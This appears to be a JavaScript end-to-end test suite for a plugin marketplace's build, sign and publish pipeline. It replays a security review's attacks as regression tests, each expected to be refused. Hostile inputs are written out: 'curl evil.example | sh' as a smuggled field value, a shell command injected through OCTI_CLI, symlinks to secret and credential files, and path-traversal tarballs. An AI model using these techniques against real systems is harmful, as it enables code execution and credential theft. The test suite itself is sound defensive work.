// The whole publish flow, end to end, against the pinned Octipus CLI:
// build (no key) → sign (the key session) → finish (no key), twice, then the
// security review's reproduced attacks as regression tests, each run against
// a published marketplace and each required to stop before anything is
// signed or written outside the script's own new directories.
import { pinnedOctipus } from './octipus.mjs';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, test } from 'node:test';
import { build } from '../scripts/build.mjs';
import { cli, octipusRef, pinProblem, REPO_ROOT } from '../scripts/lib/octi.mjs';
import { bypassPhrase, publishBuild, publishFinish } from '../scripts/publish.mjs';
import { extractTarball, sign } from '../scripts/sign.mjs';
import { assertCleanPages } from './helpers.mjs';
import { makeMarket } from './market.mjs';

const tmp = mkdtempSync(join(tmpdir(), 'octipus-publish-e2e-'));
after(() => rmSync(tmp, { recursive: true, force: true }));
const quiet = () => {};
let m;
let n = 0;
const fresh = (name) => join(tmp, `${name}-${n += 1}`);

/** CI's build record for HEAD, served by the fake gh. */
async function ciRecord() {
  const record = await build(m.repo, fresh('ci-build'));
  m.serveRecord(record);
  return record;
}

const buildOpts = (over = {}) => ({ root: m.repo, out: fresh('release'), keysFrom: m.keysFile, gh: m.gh, log: quiet, ...over });
const signOpts = (planFile, over = {}) => ({ repo: m.repo, planFile, key: m.signingKey, rootPubs: [m.rootPub], passphraseFile: m.passFile, yes: true, keysFrom: m.keysFile, log: quiet, ...over });

/** A full publish; returns the dist directory. */
async function publishAll({ first = false, indexFrom } = {}) {
  await ciRecord();
  const b = await publishBuild(buildOpts(first ? { noPreviousIndex: true } : { indexFrom }));
  await sign(signOpts(b.planFile, first ? { noPreviousIndex: true } : { indexFrom }));
  const out = fresh('dist');
  const f = await publishFinish({ root: m.repo, planFile: b.planFile, out, log: quiet });
  return { ...f, out, planFile: b.planFile };
}

/** Run `fn` on top of main, then put main and origin back where they were. */
async function attempt(fn) {
  const saved = m.g('rev-parse', 'HEAD');
  try {
    await fn();
  } finally {
    m.g('reset', '-q', '--hard', saved);
    m.g('clean', '-qfdx');
    m.g('push', '-q', '-f', 'origin', 'main');
  }
}

let live; // the dist of the last publish: its index.json is "the live index"

before(async () => {
  pinnedOctipus();
  m = await makeMarket(tmp);
});

test('publishes a first version end to end: build, sign, finish', async () => {
  const r = await publishAll({ first: true });
  assert.deepEqual(r.newVersions, [{ name: 'reader', version: '1.0.0' }]);
  const tarball = join(r.out, 'dl', 'reader-1.0.0.tar.gz');
  const index = JSON.parse(readFileSync(join(r.out, 'index.json'), 'utf8'));
  assert.equal(index.schema, 2);
  const entry = index.packages[0];
  assert.equal(entry.url, 'https://plugins.octipus.cc/dl/reader-1.0.0.tar.gz');
  assert.equal(entry.sha256, m.sha256(tarball));
  assert.equal(entry.minOctipus, '0.7.0');
  assert.match(entry.keyId, /^ed25519:[0-9a-f]{64}$/);

  // The tarball carries its signature, by the endorsed signing key.
  const unpacked = fresh('unpacked');
  mkdirSync(unpacked);
  execFileSync('tar', ['-xzf', tarball, '-C', unpacked]);
  const pkg = join(unpacked, 'reader-1.0.0');
  assert.ok(!existsSync(join(pkg, 'marketplace.json')));
  const v = await cli.verify(pkg, join(m.secrets, 'signing.pub'));
  assert.equal(v.valid, true);
  assert.equal(v.contentHash, entry.contentHash);
  assert.equal((await cli.verifyIndex(join(r.out, 'index.json'), [join(m.secrets, 'signing.pub')])).valid, true);
  assert.equal((await cli.verifyIndex(join(r.out, 'index.json'), [join(m.secrets, 'root.pub')])).valid, false, 'the root key signs keys.json only');

  // published.json records it; keys.json ships with the site.
  const published = JSON.parse(readFileSync(join(m.repo, 'published.json'), 'utf8'));
  assert.equal(published.reader['1.0.0'].sha256, entry.sha256);
  assert.equal(m.g('status', '--porcelain'), 'M published.json');
  assert.ok(existsSync(join(r.out, 'keys.json')) && existsSync(join(r.out, 'keys.json.sig')));
  assert.match(readFileSync(join(r.out, 'reader', 'index.html'), 'utf8'), /Reviewed and signed by Octipus/);
  assert.ok(existsSync(join(r.out, 'reader', 'icon.png')));
  assert.ok(existsSync(join(r.out, '_headers')));
  assert.ok(!existsSync(join(r.out, 'my-plugin')), 'the template is never published');
  assertCleanPages(assert, r.out);
  m.commitAll('Publish reader 1.0.0');
  live = r.out;
});

test('publishes a second version, anchored to the live index, and rebuilds the first byte for byte', async () => {
  const first = m.sha256(join(live, 'dl', 'reader-1.0.0.tar.gz'));
  const manifestFile = join(m.repo, 'plugins', 'reader', 'octipus-plugin.json');
  writeFileSync(manifestFile, readFileSync(manifestFile, 'utf8').replace('"version": "1.0.0"', '"version": "1.1.0"'));
  writeFileSync(join(m.repo, 'plugins', 'reader', 'CHANGELOG.md'), '# Changelog\n\n## 1.1.0\n\n- Second version (fixture).\n\n## 1.0.0\n\n- First version (fixture).\n');
  m.commitAll('reader 1.1.0');
  const r = await publishAll({ indexFrom: join(live, 'index.json') });
  assert.deepEqual(r.newVersions, [{ name: 'reader', version: '1.1.0' }]);
  assert.equal(m.sha256(join(r.out, 'dl', 'reader-1.0.0.tar.gz')), first);
  const index = JSON.parse(readFileSync(join(r.out, 'index.json'), 'utf8'));
  assert.deepEqual(index.packages.map((p) => p.version), ['1.1.0', '1.0.0']);
  m.commitAll('Publish reader 1.1.0');
  live = r.out;
});

// The review's attack1.mjs (H1): README.md a symlink to a secret on the key
// machine, a screenshot a symlink to another; before the fix the secret went
// into the signed index and the site, and dist/ got a symlink.
test('H1: a symlink in the committed tree stops publish before anything is read', async () => {
  await attempt(async () => {
    const secret = join(m.secrets, 'hosts.yml');
    writeFileSync(secret, 'github.com:\n  oauth_token: gho_SECRET_TOKEN_123\n');
    rmSync(join(m.repo, 'plugins/reader/README.md'));
    symlinkSync(secret, join(m.repo, 'plugins/reader/README.md'));
    symlinkSync(join(m.secrets, 'passphrase'), join(m.repo, 'plugins/reader/shot.png'));
    const l = JSON.parse(readFileSync(join(m.repo, 'plugins/reader/marketplace.json'), 'utf8'));
    l.screenshots = ['shot.png'];
    writeFileSync(join(m.repo, 'plugins/reader/marketplace.json'), JSON.stringify(l, null, 2));
    m.commitAll('Update the README');
    const out = fresh('release');
    await assert.rejects(publishBuild(buildOpts({ out, indexFrom: join(live, 'index.json') })), /README\.md is a symbolic link/);
    assert.ok(!existsSync(out), 'nothing was written');
  });
});

// The review's attack2.mjs (H4): change the code, keep the published
// version, drop it from published.json; before the fix 1.1.0 was re-signed
// with the new content.
test('H4: a published version cannot be dropped from published.json and re-signed', async () => {
  await attempt(async () => {
    writeFileSync(join(m.repo, 'plugins/reader/server.mjs'), `${readFileSync(join(m.repo, 'plugins/reader/server.mjs'), 'utf8')}\n// new behaviour\n`);
    const pub = JSON.parse(readFileSync(join(m.repo, 'published.json'), 'utf8'));
    delete pub.reader['1.1.0'];
    writeFileSync(join(m.repo, 'published.json'), JSON.stringify(pub, null, 2));
    m.commitAll('Tidy');
    await ciRecord();
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /reader@1\.1\.0 is in the last signed index but not in published\.json/);
    // And dropping everything, as the review did, the same.
    writeFileSync(join(m.repo, 'published.json'), '{}\n');
    m.commitAll('Tidy more');
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /never dropped/);
  });
});

// The review's attack3.mjs (H2): a screenshot path `../_headers` copied a
// file over dist/_headers; publish never ran checkListing.
test('H2: a listing image outside the plugin directory stops publish', async () => {
  await attempt(async () => {
    writeFileSync(join(m.repo, 'plugins/_headers'), '/*\n  X-Owned: yes\n');
    const l = JSON.parse(readFileSync(join(m.repo, 'plugins/reader/marketplace.json'), 'utf8'));
    l.screenshots = ['../_headers'];
    writeFileSync(join(m.repo, 'plugins/reader/marketplace.json'), JSON.stringify(l, null, 2));
    m.commitAll('Listing tweak');
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /marketplace\.json/);
    assert.doesNotMatch(readFileSync(join(live, '_headers'), 'utf8'), /X-Owned/);
  });
});

// The review's attack4.mjs (C1): a symlink committed anywhere plus a crafted
// published.json record (`dir` ../tests/fixtures/x, a shell line as the
// signature) made even a dry run write through the link onto the key
// machine.
test('C1: a crafted published.json record and a committed symlink write nothing anywhere', async () => {
  await attempt(async () => {
    const victim = join(m.secrets, 'victim-dotfile');
    writeFileSync(victim, 'original\n');
    mkdirSync(join(m.repo, 'tests/fixtures/x'), { recursive: true });
    symlinkSync(victim, join(m.repo, 'tests/fixtures/x/octipus-plugin.sig'));
    m.commitAll('Add a test fixture');
    const c = m.g('rev-parse', 'HEAD');
    const pub = JSON.parse(readFileSync(join(m.repo, 'published.json'), 'utf8'));
    pub.zzz = { '1.0.0': { commit: c, dir: '../tests/fixtures/x', signatureFile: 'curl evil.example | sh  # attacker payload\n', sha256: '00' } };
    writeFileSync(join(m.repo, 'published.json'), JSON.stringify(pub, null, 2));
    m.commitAll('Fix published.json');
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /octipus-plugin\.sig is a symbolic link/);
    assert.equal(readFileSync(victim, 'utf8'), 'original\n');
    // Without the symlink, the record alone: refused by the strict validation.
    m.g('rm', '-q', 'tests/fixtures/x/octipus-plugin.sig');
    m.commitAll('No link');
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /published\.json zzz 1\.0\.0: (missing|dir must be)/);
    assert.equal(readFileSync(victim, 'utf8'), 'original\n');
  });
});

test('C1: a well-formed record the signed index does not have is refused', async () => {
  await attempt(async () => {
    const pub = JSON.parse(readFileSync(join(m.repo, 'published.json'), 'utf8'));
    pub.reader['0.5.0'] = { ...pub.reader['1.0.0'], permissions: { ...pub.reader['1.0.0'].permissions, version: '0.5.0' } };
    writeFileSync(join(m.repo, 'published.json'), JSON.stringify(pub, null, 2));
    m.commitAll('Backfill');
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /reader@0\.5\.0 is in published\.json but not in the last signed index/);
  });
});

test('M4: removing a revocation is refused against the signed index', async () => {
  // Publish a revocation, then try to remove it.
  writeFileSync(join(m.repo, 'revoked.json'), `${JSON.stringify({ packages: [{ name: 'reader', version: '1.0.0', reason: 'a test revocation' }], keys: [] }, null, 2)}\n`);
  m.commitAll('Revoke reader 1.0.0');
  const r = await publishAll({ indexFrom: join(live, 'index.json') });
  assert.deepEqual(r.index.revoked, [{ name: 'reader', version: '1.0.0', reason: 'a test revocation' }]);
  live = r.out;
  await attempt(async () => {
    writeFileSync(join(m.repo, 'revoked.json'), '{ "packages": [], "keys": [] }\n');
    m.commitAll('Un-revoke');
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /never undone/);
  });
});

// M5: a pull request that adds its own key to keys/ changes nothing publish
// trusts: the endorsed keys come from the root-signed keys.json.
test('M5: a key that keys.json does not endorse cannot sign', async () => {
  await attempt(async () => {
    const manifestFile = join(m.repo, 'plugins', 'reader', 'octipus-plugin.json');
    writeFileSync(manifestFile, readFileSync(manifestFile, 'utf8').replace('"version": "1.1.0"', '"version": "1.2.0"'));
    writeFileSync(join(m.repo, 'plugins', 'reader', 'CHANGELOG.md'), '# Changelog\n\n## 1.2.0\n\n- Third.\n');
    cpSync(join(m.secrets, 'rogue.pub'), join(m.repo, 'keys', 'signing', 'rogue.pub'));
    writeFileSync(join(m.repo, 'keys', 'endorsements.json'), JSON.stringify({ signingKeys: [{ file: 'signing/signing.pub' }, { file: 'signing/rogue.pub' }], revokedKeys: [] }));
    m.commitAll('reader 1.2.0, and another key');
    await ciRecord();
    const b = await publishBuild(buildOpts({ indexFrom: join(live, 'index.json') }));
    assert.equal(b.plan.keys.endorsedKeyIds.length, 1);
    await assert.rejects(sign(signOpts(b.planFile, { indexFrom: join(live, 'index.json'), key: m.rogueKey })), /keys\.json does not endorse/);
    assert.ok(!existsSync(join(b.out, 'signed', 'index.json')));
  });
});

// L1: the build record comes only from a push run of build.yml on main for
// exactly this commit, in this repository.
test('L1: gh runs that are not a push to main for this commit are ignored', async () => {
  await attempt(async () => {
    const manifestFile = join(m.repo, 'plugins', 'reader', 'octipus-plugin.json');
    writeFileSync(manifestFile, readFileSync(manifestFile, 'utf8').replace('"version": "1.1.0"', '"version": "1.2.0"'));
    writeFileSync(join(m.repo, 'plugins', 'reader', 'CHANGELOG.md'), '# Changelog\n\n## 1.2.0\n\n- Third.\n');
    const c = m.commitAll('reader 1.2.0');
    const record = await build(m.repo, fresh('ci-build'));
    m.serveRecord(record, [
      { databaseId: 1, status: 'completed', conclusion: 'success', headSha: c, event: 'pull_request', headBranch: 'evil' },
      { databaseId: 2, status: 'completed', conclusion: 'success', headSha: c, event: 'push', headBranch: 'other' },
      { databaseId: 3, status: 'completed', conclusion: 'success', headSha: '0'.repeat(40), event: 'push', headBranch: 'main' },
    ]);
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /no successful build\.yml push run on main/);
    assert.match(m.ghCalls(), /run list --repo PatriceA\/octipus-plugins --workflow build\.yml --event push --branch main --commit [0-9a-f]{40}/);
    // A record without its commit (or for another one) is refused.
    m.serveRecord({ packages: record.packages }, [{ databaseId: 4, status: 'completed', conclusion: 'success', headSha: c, event: 'push', headBranch: 'main' }]);
    await assert.rejects(publishBuild(buildOpts({ indexFrom: join(live, 'index.json') })), /the build record is for/);
  });
});

// L2: a bypass of the CI compare needs the typed phrase, and the plan records it.
test('L2: --build-record and --skip-ci-compare need a typed confirmation, recorded in the plan', async () => {
  await attempt(async () => {
    const manifestFile = join(m.repo, 'plugins', 'reader', 'octipus-plugin.json');
    writeFileSync(manifestFile, readFileSync(manifestFile, 'utf8').replace('"version": "1.1.0"', '"version": "1.2.0"'));
    writeFileSync(join(m.repo, 'plugins', 'reader', 'CHANGELOG.md'), '# Changelog\n\n## 1.2.0\n\n- Third.\n');
    const c = m.commitAll('reader 1.2.0');
    const file = fresh('record.json');
    writeFileSync(file, JSON.stringify(await build(m.repo, fresh('ci-build'))));
    const idx = { indexFrom: join(live, 'index.json') };
    await assert.rejects(publishBuild(buildOpts({ ...idx, buildRecord: file })), /bypass was not confirmed/);
    await assert.rejects(publishBuild(buildOpts({ ...idx, skipCiCompare: true, confirmBypass: 'yes' })), /bypass was not confirmed/);
    const b = await publishBuild(buildOpts({ ...idx, buildRecord: file, confirmBypass: bypassPhrase(c) }));
    assert.equal(b.plan.ciCompare.mode, 'bypass');
    assert.equal(b.plan.ciCompare.confirmation, bypassPhrase(c));
  });
});

test('sign refuses a tarball, a plan or a key that is not what it should be', async () => {
  await attempt(async () => {
    const manifestFile = join(m.repo, 'plugins', 'reader', 'octipus-plugin.json');
    writeFileSync(manifestFile, readFileSync(manifestFile, 'utf8').replace('"version": "1.1.0"', '"version": "1.2.0"'));
    writeFileSync(join(m.repo, 'plugins', 'reader', 'CHANGELOG.md'), '# Changelog\n\n## 1.2.0\n\n- Third.\n');
    m.commitAll('reader 1.2.0');
    await ciRecord();
    const idx = { indexFrom: join(live, 'index.json') };
    const b = await publishBuild(buildOpts(idx));
    // The root public key from inside the repository is refused.
    await assert.rejects(sign(signOpts(b.planFile, { ...idx, rootPubs: [join(m.repo, 'keys', 'root', 'root.pub')] })), /inside the repository/);
    // Another previous index than the plan's.
    await assert.rejects(sign(signOpts(b.planFile, { noPreviousIndex: true })), /built against a previous index/);
    // A tampered tarball.
    const tarball = join(b.out, 'unsigned', 'reader-1.2.0.tar.gz');
    const bytes = readFileSync(tarball);
    rmSync(tarball);
    writeFileSync(tarball, Buffer.concat([bytes, Buffer.from([0])]));
    await assert.rejects(sign(signOpts(b.planFile, idx)), /not the tarball the plan names/);
  });
});

test('extractTarball takes files and directories only', () => {
  const dir = fresh('tar');
  mkdirSync(join(dir, 'src', 'p-1.0.0'), { recursive: true });
  writeFileSync(join(dir, 'src', 'p-1.0.0', 'a.txt'), 'a');
  symlinkSync('/etc/passwd', join(dir, 'src', 'p-1.0.0', 'link'));
  execFileSync('tar', ['--format=ustar', '-czf', join(dir, 'evil.tar.gz'), '-C', join(dir, 'src'), 'p-1.0.0']);
  mkdirSync(join(dir, 'out'));
  assert.throws(() => extractTarball(readFileSync(join(dir, 'evil.tar.gz')), join(dir, 'out')), /only files and directories/);
  execFileSync('tar', ['--format=ustar', '-czf', join(dir, 'dotdot.tar.gz'), '-C', join(dir, 'src'), '--transform', 's,^p-1.0.0/a.txt,../a.txt,', 'p-1.0.0/a.txt']);
  mkdirSync(join(dir, 'out2'));
  assert.throws(() => extractTarball(readFileSync(join(dir, 'dotdot.tar.gz')), join(dir, 'out2')), /safe relative path/);
});

// H7: only the pinned CLI, exactly at OCTIPUS_REF and clean, started through its own tsx.
test('H7: OCTI_CLI, a moving OCTIPUS_REF and a dirty or other checkout are refused', async () => {
  const ref = octipusRef();
  assert.match(ref, /^[0-9a-f]{40}$/);
  const dir = pinnedOctipus();
  assert.equal(pinProblem(dir, ref), null);
  assert.match(pinProblem(dir, '0'.repeat(40)), /not OCTIPUS_REF/);
  const readme = join(dir, 'README.md');
  const was = readFileSync(readme);
  writeFileSync(readme, Buffer.concat([was, Buffer.from('\nlocal change\n')]));
  try { assert.match(pinProblem(dir, ref), /local changes/); } finally { writeFileSync(readme, was); }
  const r = spawnSync(process.execPath, ['--input-type=module', '-e', `import { cli } from ${JSON.stringify(join(REPO_ROOT, 'scripts/lib/octi.mjs'))}; await cli.hash('.');`], { encoding: 'utf8', env: { ...process.env, OCTI_CLI: 'sh -c "touch /tmp/pwned"' } });
  assert.notEqual(r.status, 0);
  assert.match(r.stderr, /OCTI_CLI is set/);
  const ref2 = fresh('ref');
  mkdirSync(ref2);
  writeFileSync(join(ref2, 'OCTIPUS_REF'), 'refs/pull/1/head\n');
  assert.throws(() => octipusRef(ref2), /40-hex/);
  const repo = fresh('pin');
  mkdirSync(repo);
  writeFileSync(join(repo, 'OCTIPUS_REF'), `${ref}\n`);
  await assert.rejects(sign({ repo, planFile: 'x', env: { ...process.env, OCTI_CLI: 'octi plugin' }, log: quiet }), /OCTI_CLI is set/);
  // No npx anywhere in the scripts.
  for (const f of ['scripts/lib/octi.mjs', 'scripts/sign.mjs', 'scripts/keys.mjs']) assert.doesNotMatch(readFileSync(join(REPO_ROOT, f), 'utf8'), /['"`]npx(\.cmd)?['"`]/, f);
});

test('the sign script imports only Node built-ins', () => {
  const text = readFileSync(join(REPO_ROOT, 'scripts', 'sign.mjs'), 'utf8');
  for (const im of text.matchAll(/^import .* from '([^']+)';$/gm)) assert.match(im[1], /^node:/, im[1]);
  assert.ok(readdirSync(join(REPO_ROOT, 'scripts')).includes('sign.mjs'));
});

// The documented rotation: root endorses the new key beside the old one,
// publish re-signs every live version with the new key (same content hash,
// rebuilt reproducibly), and the anchor accepts exactly that change.
test('a key rotation re-signs every live version with the new key', async () => {
  await cli.keygen(join(m.secrets, 'signing2'), { passphrase: 'another passphrase here\n' });
  const pass2 = join(m.secrets, 'pass2');
  writeFileSync(pass2, 'another passphrase here\n', { mode: 0o600 });
  cpSync(join(m.secrets, 'signing2.pub'), join(m.repo, 'keys', 'signing', 'signing2.pub'));
  writeFileSync(join(m.repo, 'keys', 'endorsements.json'), JSON.stringify({ signingKeys: [{ file: 'signing/signing.pub' }, { file: 'signing/signing2.pub' }], revokedKeys: [] }));
  m.commitAll('Endorse signing2');
  const { buildKeysDoc } = await import('../scripts/keys.mjs');
  const { fingerprint } = await import('../scripts/sign.mjs');
  const prevDoc = JSON.parse(readFileSync(m.keysFile, 'utf8'));
  const keys2 = await m.writeKeys(buildKeysDoc({ repo: m.repo, previous: prevDoc }), join(tmp, 'live', 'keys2.json'));
  const newId = fingerprint(readFileSync(join(m.secrets, 'signing2.pub'), 'utf8')).keyId;
  const indexFrom = join(live, 'index.json');
  const b = await publishBuild(buildOpts({ indexFrom, keysFrom: keys2, resignTo: newId }));
  // 1.0.0 is revoked: it keeps its old signature; 1.1.0 is re-signed.
  assert.deepEqual(b.plan.packages.map((p) => `${p.kind} ${p.name}@${p.version}`), ['resign reader@1.1.0']);
  await assert.rejects(sign(signOpts(b.planFile, { indexFrom, keysFrom: keys2 })), /re-signs with/);
  rmSync(join(b.out, 'signed'), { recursive: true, force: true });
  await sign(signOpts(b.planFile, { indexFrom, keysFrom: keys2, key: join(m.secrets, 'signing2.key'), passphraseFile: pass2 }));
  const out = fresh('dist');
  const f = await publishFinish({ root: m.repo, planFile: b.planFile, out, log: quiet });
  const byVersion = Object.fromEntries(f.index.packages.map((e) => [e.version, e]));
  assert.equal(byVersion['1.1.0'].keyId, newId);
  assert.equal(byVersion['1.1.0'].contentHash, JSON.parse(readFileSync(indexFrom, 'utf8')).packages.find((e) => e.version === '1.1.0').contentHash);
  assert.notEqual(byVersion['1.0.0'].keyId, newId);
  assert.ok(f.published.reader['1.1.0'].resignedAt);
  m.commitAll('Re-sign with signing2');
  live = out;
});
